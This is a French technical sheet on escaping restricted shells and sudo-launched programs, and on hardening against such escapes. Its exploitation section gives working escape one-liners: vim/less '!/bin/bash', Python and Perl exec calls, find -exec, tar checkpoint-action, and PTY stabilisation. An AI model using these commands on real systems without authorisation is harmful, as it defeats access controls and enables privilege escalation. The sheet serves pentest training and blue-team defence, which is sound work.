---
title: Shell Escape — Évasion de Shell Restreint et Contournement de Sous-Coquille
description: Fiche technique exhaustive sur les mécanismes système (execve, PATH, TTY/PTY) permettant l'évasion des shells restreints (rbash, lshell) et le breakout depuis des interfaces applicatives privilégiées.
tags:
  - linux
  - unix
  - securite
  - pentest
  - privilege-escalation
  - shell-restreint
  - rbash
  - sudoers
  - tty
  - execve
---

# Shell Escape : Évasion de Shell Restreint

## 1. Résumé Exécutif & Contexte

### 1.1 Définition

Le **Shell Escape** (évasion de shell) désigne l'ensemble des techniques permettant à un opérateur, confiné dans un environnement d'exécution volontairement contraint (shell restreint, application interactive privilégiée, session `sudo` limitée), de **reprendre le contrôle d'un interpréteur de commandes non contraint**, généralement doté des mêmes privilèges Unix (UID/GID) que le processus depuis lequel l'évasion a eu lieu.

Il ne s'agit **pas** d'une vulnérabilité logicielle au sens classique (buffer overflow, injection mémoire), mais de l'exploitation d'une **erreur de conception ou de confiance** : un shell restreint (ou une application censée limiter l'utilisateur) invoque, directement ou indirectement, un sous-programme qui offre lui-même une primitive d'exécution de commande arbitraire (`!cmd`, `:!sh`, `system()`, fonction `exec`, etc.).

!!! note "Définition formelle"
    Un shell restreint (`rbash`, `rksh`, `lshell`, `rssh`) applique ses contraintes **uniquement au niveau de l'interpréteur qui l'exécute**. Ces contraintes ne sont **pas héritées de manière fiable** par tout programme externe qu'il lance, car le noyau Linux n'a aucune notion de « shell restreint » — cette notion est purement applicative et non appliquée par le kernel.

### 1.2 Contexte d'apparition

Les scénarios de shell escape apparaissent typiquement dans :

- **Interfaces restreintes fournies aux utilisateurs** : bastions SSH, terminaux de support technique, environnements de type « jump host » utilisant `rbash` ou `lshell`.
- **Applications interactives lancées avec des privilèges élevés** via `sudo` (ex : `sudo vim`, `sudo less /var/log/syslog`, `sudo tcpdump`), où le binaire autorisé embarque une fonctionnalité d'exécution de commande.
- **Éditeurs, pagers et éditeurs de configuration** invoqués par des scripts d'administration privilégiés (crontab root appelant `vipw`, `visudo`, etc.).
- **Conteneurs et bacs à sable applicatifs** (CLI restreintes de type FTP, CLI réseau propriétaire) où un sous-shell caché existe pour du debug.
- **Règles `sudoers` mal rédigées** autorisant un binaire complet plutôt qu'une action précise, sans clause `NOEXEC` ni restriction d'arguments.

### 1.3 Shell Escape ≠ Élévation de Privilèges

C'est la distinction conceptuelle la plus importante de cette fiche.

| Critère | Shell Escape (évasion) | Privilege Escalation (élévation) |
|---|---|---|
| **Objectif** | Obtenir un interpréteur de commandes libre, **sans contrainte de menu/whitelist** | Obtenir des privilèges **supérieurs** à ceux actuellement détenus (UID/GID différent) |
| **UID/GID résultant** | Identique à celui du processus parent restreint | Généralement `root` (UID 0) ou un autre compte plus privilégié |
| **Mécanisme typique** | Sortie d'un menu, d'un pager ou d'un shell à liste blanche de commandes | Exploitation de SUID/SGID, capabilities, sudoers, exploit noyau, mauvaise permission de fichier |
| **Analogie** | Sortir de la pièce fermée à clé | Voler les clés du coffre-fort |

!!! warning "Complémentarité, pas exclusivité"
    Les deux techniques sont **très souvent chaînées** : un shell escape depuis `sudo vim` produit *directement* une élévation de privilèges (car `vim` était lancé en `root`), tandis qu'un shell escape depuis `rbash` en tant qu'utilisateur `bob` ne fait qu'obtenir un `bash` complet — **toujours en tant que `bob`**. Il faudra ensuite chercher un vecteur de *privilege escalation* séparé (SUID, sudoers, cron, etc.) pour progresser vers `root`.

---

## 2. Mécanismes & Fonctionnement Interne (Le « Pourquoi »)

Cette section explique **pourquoi** ces évasions sont systémiquement possibles, au niveau du noyau et de la libc, plutôt que de simplement lister des commandes.

### 2.1 Héritage de contexte entre processus parent et enfant

Sous Linux, un shell (restreint ou non) est un **processus utilisateur ordinaire**. Lorsqu'il crée un sous-processus, la séquence système typique est :

1. `fork()` — duplication de l'espace d'adressage du processus courant (copy-on-write).
2. `execve(pathname, argv[], envp[])` — remplacement de l'image mémoire du processus enfant par un nouveau programme.

```c
/* Signature POSIX de l'appel système central de toute exécution */
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

Le point fondamental est que **`execve()` ne transmet aucune notion de « restriction »**. Le noyau ne connaît que :

- les **permissions du fichier binaire** (bits `rwx`, SUID/SGID) ;
- l'**UID/GID réel et effectif** du processus appelant ;
- les **capabilities** (`CAP_*`) éventuellement attachées ;
- le contexte **SELinux/AppArmor** (label de sécurité), si un LSM (*Linux Security Module*) est actif.

Les restrictions imposées par `rbash` (liste blanche de commandes, interdiction de `cd`, blocage de `PATH`, interdiction des redirections `>`, `>>`, `|`) sont des **contrôles logiciels internes à l'interpréteur bash lui-même**, implémentés au niveau du code C de `bash` (drapeau `restricted_shell` dans `shell.c`). Ces contrôles **cessent d'exister dès qu'un autre binaire prend le relais via `execve()`**, car ce nouveau binaire ne partage ni le code ni l'état interne de `bash`.

!!! danger "Point clé à retenir"
    Une restriction shell est une **politique en espace utilisateur (userland)**, jamais une politique noyau. Tout programme externe capable d'appeler à son tour `execve()`, `system()`, `fork()+exec()`, ou d'ouvrir un pseudo-terminal, réintroduit une exécution de commande libre, car **le noyau autorisera cet appel sans consulter la politique du shell parent**.

### 2.2 Rôle de la variable `PATH`

`rbash` bloque en général la **modification** de `PATH` (`set +r` n'est pas autorisé, `PATH=` déclenche une erreur `restricted: PATH: readonly variable`). Mais ce blocage ne protège que la **résolution de commande interne à bash** (recherche d'un exécutable nommé sans chemin absolu).

```bash
# Dans un rbash, ceci est bloqué :
$ PATH=/tmp:$PATH
bash: PATH: readonly variable

# Mais l'invocation par CHEMIN ABSOLU d'un binaire autorisé (whitelisté)
# n'est PAS filtrée par la variable PATH — elle passe directement à execve() :
$ /usr/bin/vim
```

Une fois **à l'intérieur** d'un programme tiers (ex: `vim`), ce programme n'a **plus aucune connaissance** de la politique `PATH` imposée par `rbash` : il utilise son propre appel `execve()` ou `system()`, indépendant du contexte du shell parent.

### 2.3 La fonction `system()` de la libc : le point de bascule central

De très nombreux binaires (éditeurs, pagers, langages de script) exposent une fonctionnalité « exécuter une commande shell » qui repose, en interne, sur la fonction C standard :

```c
#include <stdlib.h>
int system(const char *command);
```

**Fonctionnement interne de `system()`** (spécifié par POSIX) :

```text
1. system() effectue un fork() du processus appelant.
2. Le processus enfant exécute : execve("/bin/sh", ["sh", "-c", command], environ);
3. Le processus parent (celui qui a appelé system()) attend (wait())
   la terminaison du processus enfant.
```

!!! note "Pourquoi c'est déterminant"
    `system()` invoque **toujours** `/bin/sh` (généralement un lien symbolique vers `dash` ou `bash` selon la distribution), et ce **nouveau `/bin/sh` n'est PAS un shell restreint**, sauf si le binaire hôte a été explicitement compilé/configuré pour forcer un shell restreint (ce qui est extrêmement rare). Il hérite en revanche de l'UID/GID effectif du processus qui a appelé `system()` — d'où l'importance capitale du contexte `sudo`.

### 2.4 Cas spécifique : exécution sous `sudo`

Quand une commande est lancée via `sudo binaire`, le noyau exécute `binaire` avec l'**UID effectif root** (ou l'utilisateur cible défini dans `sudoers`). Si `binaire` invoque en interne `system()` ou `execve()` (via une fonctionnalité « lancer un éditeur externe », « exécuter un filtre », « ouvrir un shell de secours »), le sous-processus résultant héritera de **ce même UID effectif root**.

```text
┌────────────┐   sudo (UID root)    ┌──────────────┐   system("/bin/sh")   ┌────────────┐
│ utilisateur│ ───────────────────► │  binaire      │ ─────────────────────► │ /bin/sh    │
│ (UID 1000) │                      │ (UID eff. 0)  │                        │ (UID eff.0)│
└────────────┘                      └──────────────┘                        └────────────┘
```

C'est ce mécanisme précis qui transforme un simple *shell escape* (`sudo vim` → `:!sh`) en une **élévation de privilèges complète** (`root`), et qui explique le rôle central du référentiel **GTFOBins**.

### 2.5 Gestion du TTY/PTY : pourquoi certains breakouts nécessitent un pseudo-terminal

Un shell interactif normal (bash, zsh) attend un terminal contrôlant (*controlling terminal*), matérialisé par un périphérique `/dev/pts/N`. Sans TTY correctement alloué :

- pas de gestion des signaux de job control (`Ctrl+C`, `Ctrl+Z`) ;
- pas d'historique de commande interactif complet ;
- certains programmes (`su`, `passwd`, `sudo` avec `requiretty`) **refusent de s'exécuter** sans TTY réel.

Un **reverse shell brut** (`nc`, ou redirection de descripteurs de fichiers vers un socket) obtenu via une évasion applicative n'est souvent qu'un **pseudo-shell dégradé**, sans PTY. La technique de spawn de PTY complet via Python (détaillée en §5.4) exploite l'appel système `forkpty()` (ou la primitive équivalente du module `pty`) pour allouer un vrai terminal maître/esclave, ce qui **stabilise** la session, active le job control et permet l'usage d'outils interactifs (`vim`, `su`, saisie de mot de passe masquée).

```c
/* forkpty() encapsule : openpty() + fork() + login_tty() */
int forkpty(int *amaster, char *name, const struct termios *termp,
            const struct winsize *winp);
```

---

## 3. Empreinte & Détection

Avant toute tentative d'évasion, un opérateur (ou un auditeur défensif souhaitant valider l'étanchéité d'un environnement) doit **cartographier le périmètre** de la restriction.

### 3.1 Identifier si l'on est dans un environnement restreint

```bash
# Vérifier le shell courant déclaré
echo $SHELL          # ex: /bin/rbash ou /usr/bin/lshell

# Vérifier le shell RÉELLEMENT exécuté (peut différer de $SHELL si spoofé)
ps -p $$ -o comm=     # affiche le nom du binaire du processus courant (PID $$)

# Tenter de modifier PATH : une erreur "readonly variable" confirme rbash
PATH=/tmp:$PATH

# Tenter cd : rbash interdit le changement de répertoire
cd /tmp

# Tenter une redirection de sortie : rbash bloque > et >>
echo test > /tmp/test.txt
```

!!! tip "Signature caractéristique de rbash"
    Le message d'erreur `bash: <commande>: restricted: cannot specify '/' in command names` apparaît lorsque `rbash` empêche l'exécution d'un binaire via un **chemin explicite** (relatif ou absolu) en dehors de la liste blanche. Ce message est une empreinte fiable pour confirmer un `rbash` actif.

### 3.2 Audit du `$PATH` et des binaires accessibles

```bash
# Lister les répertoires exposés dans le PATH (souvent restreint à un seul dossier
# contenant des liens symboliques vers un sous-ensemble de binaires autorisés)
echo $PATH

# Lister le contenu du/des répertoire(s) exposés : révèle la "liste blanche" réelle
ls -la $(echo $PATH | tr ':' ' ')

# Lister les commandes internes (builtins) encore actives
compgen -b 2>/dev/null || enable

# Vérifier si sudo est utilisable et avec quels binaires (vecteur direct GTFOBins)
sudo -l
```

### 3.3 Détection des binaires « à risque » (fonction interactive ou d'exécution)

Un binaire est considéré à risque d'évasion s'il expose au moins l'une de ces primitives :

- une **fonction de recherche/pager intégrée** avec échappement shell (`!cmd`, `:!cmd`) ;
- une **fonctionnalité de script/plugin** (macros Vim, scripts Lua dans `nmap`, sous-shell Perl/Python/awk) ;
- une **option d'édition externe** (`EDITOR`, `PAGER`, `VISUAL` invoqués par le programme) ;
- un **mode debug ou verbeux** exposant un interpréteur.

```bash
# Recherche systématique via strings() des appels système suspects dans un binaire
strings /usr/bin/<binaire> | grep -E '^(sh|/bin/sh|/bin/bash|system|popen)$'

# Vérifier les appels de bibliothèque dynamiques liés à l'exécution de commandes
ldd /usr/bin/<binaire>
nm -D /usr/bin/<binaire> 2>/dev/null | grep -iE 'system|exec|popen'
```

---

## 4. Méthodologie d'Exploitation

!!! danger "Cadre d'usage"
    Les techniques suivantes doivent être appliquées **exclusivement** dans un cadre légal et autorisé : audit de sécurité sous mandat, CTF, laboratoire personnel, ou test d'intrusion contractuel. L'utilisation contre un système sans autorisation explicite est illégale dans la quasi-totalité des juridictions.

### 4.1 Escape via Pagers & Éditeurs

Les pagers et éditeurs sont les vecteurs historiques les plus fiables, car ils sont fréquemment invoqués via `sudo` pour la consultation de logs ou l'édition de fichiers de configuration.

#### `less` / `more`

```bash
# Invocation typique en contexte privilégié :
sudo less /var/log/auth.log

# Une fois DANS le pager (interface interactive de less), taper :
!/bin/bash
# Explication : less implémente la commande "!" comme un appel direct à system(),
# transmettant tout ce qui suit "!" comme argument shell -c.
# Le shell obtenu hérite de l'UID effectif de "less" (donc root si lancé via sudo).
```

```bash
# Alternative sans passer par le mode interactif, via une variable d'environnement
# PAGER externe surchargée AVANT l'invocation, si le programme appelant respecte $PAGER :
PAGER='/bin/bash -c "exec /bin/bash 1>&0"' sudo -s
```

#### `vi` / `vim`

```bash
# Depuis le mode commande (Echap puis ":") :
:!/bin/bash
# ":!" invoque system() avec la commande fournie.

# Alternative : mode shell interne complet, remplaçant vim par le shell
:shell

# Alternative : commande de sauvegarde détournée pour exécution
:w !/bin/bash
```

#### `nano`

```bash
# nano expose une commande d'exécution externe via Ctrl+R puis Ctrl+X (Execute Command)
# selon les versions récentes, ou via l'option --rcfile détournée au lancement :
nano
# Ctrl+R (Insérer un fichier) -> Ctrl+X (Exécuter une commande) -> taper : bash
```

### 4.2 Escape via Langages de Script

Les interpréteurs de langage exposent presque tous une primitive d'exécution système native, héritée de leur bibliothèque standard.

```bash
# --- Python : os.system() encapsule directement system(3) de la libc ---
python3 -c 'import os; os.system("/bin/bash")'

# --- Python : os.execve() remplace intégralement l'image du processus courant ---
python3 -c 'import os; os.execve("/bin/bash", ["bash"], os.environ)'

# --- Perl : exec() applique le même mécanisme execve() sous-jacent ---
perl -e 'exec "/bin/bash";'

# --- Ruby : Kernel#exec appelle execve() via la libc ---
ruby -e 'exec "/bin/bash"'

# --- Lua (souvent embarqué, ex: scripting nmap --script) ---
lua -e 'os.execute("/bin/bash")'

# --- AWK : la fonction system() de gawk mappe directement sur system(3) ---
awk 'BEGIN {system("/bin/bash")}'
```

!!! note "Différence os.system() vs os.execve() en Python"
    `os.system()` effectue un `fork()` + `execve("/bin/sh", ...)` puis **attend** la fin du sous-processus (le processus Python reste vivant en parallèle). `os.execve()` **remplace immédiatement** l'image mémoire du processus Python courant — il n'y a plus de retour possible dans l'interpréteur Python après cet appel, ce qui est souvent préférable pour la stabilité du shell obtenu (pas de double couche de processus).

### 4.3 Escape via Binaires Utilitaires

De nombreux utilitaires système « de confiance » embarquent des fonctionnalités annexes exploitables.

```bash
# --- find : l'option -exec appelle execve() directement sur chaque résultat ---
find . -exec /bin/bash \; -quit
# "-quit" limite l'exécution au premier résultat trouvé pour éviter les boucles.

# --- env : conçu pour lancer un programme dans un environnement modifié,
#     donc appelle nativement execve() sur sa cible ---
env /bin/bash

# --- tar : l'option --checkpoint-action permet d'exécuter une commande
#     arbitraire à chaque "point de contrôle" pendant l'archivage ---
tar cf /dev/null /dev/null --checkpoint=1 \
    --checkpoint-action=exec=/bin/bash

# --- nmap : le mode interactif historique (--interactive, obsolète mais
#     encore présent sur certaines vieilles versions) ou le moteur NSE (Lua)
#     permettent l'exécution de commandes ---
nmap --script=/tmp/malicious_nse_script.nse  # via os.execute() en Lua (cf §4.2)

# --- man : le pager sous-jacent (souvent "less") reste accessible ---
man man
# Puis dans l'interface : !/bin/bash
```

!!! tip "Méthodologie générique"
    Pour tout binaire non listé ici, la démarche d'audit reste identique : chercher une fonctionnalité « exécuter/filtrer/éditer via un programme externe », ou une option documentée dans la page `man` contenant les mots *execute*, *shell*, *command*, *filter*, *pager*, *editor*. Le référentiel **GTFOBins** (voir §7) formalise cette recherche pour des centaines de binaires Unix.

### 4.4 Techniques de Breakout TTY / Spawn de PTY

Un shell obtenu par les méthodes ci-dessus est parfois **dégradé** (pas de contrôle de job, pas d'échappement des signaux, historique absent). La stabilisation en TTY complet est une étape méthodologique à part entière.

```bash
# --- Étape 1 : spawn d'un PTY complet via le module Python "pty" ---
# pty.spawn() encapsule forkpty() + relai bidirectionnel des descripteurs
# de fichiers standard (stdin/stdout/stderr) vers le pseudo-terminal esclave.
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
# --- Étape 2 : mise en arrière-plan pour reconfigurer le terminal local ---
# Ctrl+Z suspend le shell obtenu (envoi de SIGTSTP) et rend la main
# au shell/terminal d'origine de l'opérateur.
^Z

# --- Étape 3 : désactivation de l'echo local et passage en mode "raw" ---
# stty raw -echo empêche le terminal local de dupliquer l'affichage
# et transmet les caractères de contrôle (Ctrl+C, flèches...) directement
# au shell distant plutôt que de les intercepter localement.
stty raw -echo; fg

# --- Étape 4 : réinitialisation de la variable TERM après reprise du foreground ---
# "fg" relance le processus suspendu ; il faut ensuite retaper "reset" ou
# redéfinir TERM pour restaurer un affichage correct (couleurs, effacement d'écran)
reset
export TERM=xterm-256color
export SHELL=/bin/bash

# --- Étape 5 (alternative) : utilisation de script(1) pour allouer un PTY ---
# script(1) utilise également forkpty() en interne et journalise la session,
# ce qui la rend indépendante d'un interpréteur Python présent sur la cible.
script -qc /bin/bash /dev/null
```

!!! warning "Pourquoi `stty raw -echo` avant `fg` et non après"
    L'ordre des opérations est déterminant : `stty raw -echo` doit être appliqué **au terminal local de l'opérateur** pendant que le shell distant est suspendu en arrière-plan (après `Ctrl+Z`), puis `fg` restaure ce shell au premier plan avec la nouvelle configuration de terminal déjà active. Inverser l'ordre laisse une fenêtre où les caractères spéciaux (`Ctrl+C`) sont interceptés par le mauvais processus.

---

## 5. Remédiation & Hardening (Perspective Blue Team)

### 5.1 Configuration rigoureuse des profils restreints

- **Ne jamais se fier à `rbash` seul comme unique couche de sécurité.** `rbash` est un contrôle en espace utilisateur, contournable dès qu'un binaire externe autorisé expose une primitive d'exécution (cf. §2.1).
- Restreindre `PATH` à un répertoire **dédié**, ne contenant que des **liens symboliques explicitement audités** vers des binaires ne présentant *aucune* fonctionnalité d'échappement connue.
- Bannir de la liste blanche tout éditeur de texte complet, tout pager non patché, et tout interpréteur de langage généraliste (Python, Perl, awk, Lua) sauf besoin métier impératif et justifié.
- Préférer des outils dédiés à `lshell` ou `rbash` conçus nativement pour l'usage restreint (ex: `lshell` avec liste blanche stricte de commandes ET filtrage d'arguments, contrairement à `rbash` qui ne filtre pas les arguments d'un binaire autorisé).

```text
# Exemple de configuration lshell (/etc/lshell.conf) minimisant la surface :
[user_alice]
allowed         : ['ls', 'cat', 'pwd', 'grep']
forbidden       : [';', '&', '|', '`', '>', '<', '$(', '${']
path            : ['/home/alice']
env_path        : ':/usr/bin/restricted_bin'
scp             : 0
sftp            : 0
overssh         : ['scp', 'rsync']
```

### 5.2 Sécurisation de `/etc/sudoers`

!!! danger "Erreur de conception la plus fréquente"
    Autoriser un binaire complet (`ALL = (root) /usr/bin/vim`) plutôt qu'une commande précise avec arguments figés est la cause numéro un des chaînes *shell escape → privilege escalation* via `sudo`. Consulter systématiquement l'entrée correspondante sur GTFOBins **avant** d'écrire une règle `sudoers`.

```text
# --- MAUVAISE PRATIQUE : autorise l'échappement complet via ":!sh" dans vim ---
alice ALL=(root) NOPASSWD: /usr/bin/vim

# --- MEILLEURE PRATIQUE : restreindre à un fichier précis ET désactiver
#     les capacités d'exécution externe de vim via une option de lancement ---
alice ALL=(root) NOPASSWD: /usr/bin/vim -u NONE -c 'set noexec' /etc/app/config.yml

# --- Utilisation de NOEXEC pour empêcher le sous-processus exécuté par sudo
#     de lancer lui-même un execve() supplémentaire (protection au niveau
#     de la libc via LD_PRELOAD injecté par sudo, interceptant execve/execv) ---
alice ALL=(root) NOEXEC: /usr/bin/find
```

!!! warning "Limites de NOEXEC"
    L'option `NOEXEC` de `sudoers` fonctionne en **préchargeant une bibliothèque partagée** (`sudo_noexec.so`) qui intercepte les appels `execve()`/`execv()`/`execl()` du binaire fils **via la libc dynamique**. Elle est **inefficace** contre :
    
    - les binaires **statiquement liés** (n'utilisant pas la libc dynamique interceptée) ;
    - les binaires effectuant des **appels système directs** via `syscall()` en contournant la libc ;
    - les techniques de script (Python `os.execve` peut, selon la configuration système, appeler directement le syscall sans repasser par le wrapper intercepté).
    
    `NOEXEC` est une **mitigation**, pas une garantie absolue — elle doit être combinée avec du sandboxing (§5.3).

### 5.3 Sandboxing, AppArmor / SELinux, Linux Capabilities

Puisque la restriction shell est purement applicative (§2.1), une défense robuste doit s'appuyer sur des **contrôles noyau**, qui eux s'appliquent indépendamment de tout `execve()` en cascade.

```bash
# --- AppArmor : confinement d'un profil applicatif, appliqué par le LSM
#     du noyau à CHAQUE execve(), quel que soit le binaire invoqué ---
# Exemple de règle interdisant l'exécution de tout interpréteur shell
# depuis le profil confiné d'un binaire donné :
/usr/bin/vim {
  deny /bin/bash x,
  deny /bin/sh x,
  deny /usr/bin/python3 x,
}
```

```bash
# --- SELinux : application de types de contexte empêchant la transition
#     de domaine vers un shell interactif depuis un domaine restreint ---
# Vérification du contexte courant :
id -Z

# Exemple de politique interdisant la transition vers un domaine "shell_t"
# depuis un domaine applicatif confiné "restricted_app_t" :
# (extrait conceptuel d'un fichier .te SELinux)
neverallow restricted_app_t shell_exec_t:process transition;
```

```bash
# --- Linux Capabilities : réduction du jeu de capacités disponibles
#     au processus, indépendamment de l'UID effectif ---
# Vérifier les capabilities attachées à un binaire :
getcap /usr/bin/exemple

# Retirer les capacités superflues plutôt que de s'appuyer sur un bit SUID root complet
setcap cap_net_bind_service=+ep /usr/bin/exemple
# Ce binaire peut désormais se lier à un port privilégié SANS jamais
# posséder l'UID effectif root, limitant drastiquement l'impact d'un
# éventuel shell escape depuis ce processus.
```

### 5.4 Synthèse des principes de durcissement

!!! tip "Checklist de remédiation"
    1. Ne jamais considérer un shell restreint comme une frontière de sécurité suffisante à elle seule.
    2. Auditer systématiquement chaque binaire de la liste blanche via GTFOBins avant de l'autoriser.
    3. Préférer les règles `sudoers` avec arguments figés et `NOEXEC`, tout en connaissant ses limites.
    4. Superposer un contrôle noyau (AppArmor/SELinux) qui s'applique indépendamment du contexte applicatif.
    5. Réduire les capabilities et éviter les binaires SUID root génériques ; préférer des capacités ciblées.
    6. Auditer les logs d'audit noyau (`auditd`, règles `-a exit,always -F arch=b64 -S execve`) pour détecter les chaînes d'exécution anormales en temps réel.

```bash
# Exemple de règle auditd pour journaliser tout execve() déclenché
# par un processus enfant d'un shell restreint (détection a posteriori) :
auditctl -a exit,always -F arch=b64 -S execve -F key=shell_escape_watch
ausearch -k shell_escape_watch
```

---

## 6. Références & Cheat Sheets

!!! note "Ressources externes recommandées"
    - **GTFOBins** — catalogue exhaustif des binaires Unix exploitables pour le bypass de restrictions locales, l'élévation de privilèges et l'exfiltration de fichiers : consulter les fonctions *Shell*, *Sudo* et *SUID* pour chaque binaire cité dans cette fiche.
    - **PayloadsAllTheThings** — dépôt communautaire regroupant des payloads et méthodologies pour de nombreuses classes de vulnérabilités, incluant une section dédiée au *Linux/RBASH escape*.
    - Page de manuel `execve(2)` — spécification POSIX/Linux de l'appel système central à toute exécution de programme.
    - Page de manuel `system(3)` — comportement détaillé de la fonction libc encapsulant `fork()` + `execve("/bin/sh", ...)`.
    - Page de manuel `sudoers(5)` — syntaxe complète des directives `NOEXEC`, `NOPASSWD`, et gestion des alias de commandes.
    - Documentation `forkpty(3)` et `pty(7)` — mécanismes noyau d'allocation de pseudo-terminaux, pertinents pour comprendre la stabilisation TTY (§4.4).

!!! tip "Méthode de recherche rapide"
    Pour tout nouveau binaire rencontré dans une liste blanche, la requête `<nom_du_binaire> gtfobins` en moteur de recherche constitue le point d'entrée le plus rapide pour vérifier l'existence d'un vecteur de shell escape ou de privilege escalation documenté.
